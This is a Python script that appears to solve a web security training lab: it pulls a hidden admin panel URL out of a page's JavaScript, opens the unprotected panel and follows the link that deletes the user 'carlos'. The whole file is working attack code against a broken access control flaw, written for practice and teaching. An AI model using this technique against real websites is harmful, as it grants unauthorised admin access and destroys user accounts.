from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import re


def solve_lab(session, *args):
    # Extract and visit admin URL
    print_info(
        f'Extracting admin URL from the JavaScript included in "{session.url}"...'
    )
    resp = session.get_path("/")
    if resp.status_code != 200:
        print_fail(f"Unable to visit URL.")

    match = re.search(r"adminPanelTag.setAttribute\('href', '(.*)'\);", resp.text)
    if match is None:
        print_fail("Unable to find administrative URL.")
    else:
        url = urljoin(session.url, match.group(1))
        print_success(f"Found URL: {url}\n")

    print_info(f'Visiting "{url}"...')
    resp = session.get(url)
    if resp.status_code != 200:
        print_fail(f"Unable to visit URL.")
    else:
        print_success("GET request came back with a successful response.\n")

    # Delete user carlos
    print_info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "html.parser")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
    if tag is None:
        print_fail("Unable to find URL.")
    else:
        url = urljoin(url, tag.get("href"))
        print_success(f"Found URL: {url}\n")

    print_info("Visiting URL to delete the user carlos...")
    resp = session.get(url)
    if resp.status_code != 200:
        print_fail(f"GET request unsuccessful.")
    else:
        print_success("Success.\n")
